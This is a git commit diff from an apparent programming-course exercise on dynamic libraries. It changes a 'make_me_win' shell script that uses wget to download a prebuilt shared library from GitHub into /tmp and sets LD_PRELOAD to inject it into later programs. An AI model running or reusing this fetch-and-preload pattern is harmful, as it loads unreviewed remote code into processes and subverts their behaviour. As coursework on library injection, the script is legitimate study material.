4e6ec3212453bc7b0fdf8b8bc82e757b9f434506
Tchaye Arthur <81367794+fayoxis@users.noreply.github.com>
2024-01-20 00:31:28 +0100

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/libinjection.so https://github.com/BennettDixon/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libinjection.so
-export LD_PRELOAD=/tmp/libinjection.so
+wget -P /tmp https://github.com/fayoxis/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
